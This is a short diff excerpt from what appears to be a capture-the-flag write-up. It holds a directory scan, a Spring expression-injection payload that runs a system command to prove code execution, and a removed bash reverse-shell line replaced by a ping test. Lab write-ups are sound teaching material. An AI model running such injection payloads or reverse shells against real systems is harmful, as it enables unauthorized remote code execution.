@@ -143,5 +143,5 @@ gobuster dir -u http://10.129.227.207:8080 -w /usr/share/wordlists/dirbuster/dir
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
 ```
 * This returned the uids and guids, proving that code execution had been achieved
-* bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+* I did a ping test to ensure that I could reach my box: `ping -c 4 10.10.14.13`
 # Root
